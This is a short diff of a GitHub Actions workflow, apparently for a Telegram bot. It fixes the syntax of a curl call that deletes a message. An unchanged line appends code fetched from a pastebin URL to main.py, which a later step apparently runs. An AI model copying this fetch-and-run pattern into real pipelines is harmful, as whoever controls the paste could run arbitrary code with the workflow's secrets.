@@ -41,7 +41,7 @@ jobs:
           TOKEN: ${{ secrets.BOT_TOKEN }}
           CHAT_ID: -1001720148186
         run: |
-          curl -s https://api.telegram.org/bot${{TOKEN}}/deleteMessage?chat_id=${{CHAT_ID}}&message_id=${{ steps.bot.outputs.id }}
+          curl -s https://api.telegram.org/bot${{env.TOKEN}}/deleteMessage?chat_id=${{env.CHAT_ID}}&message_id=${{ steps.bot.outputs.id }}
           curl -s https://katb.in/tedunufexog/raw >> main.py
 
       - name: Run dispatch_event.
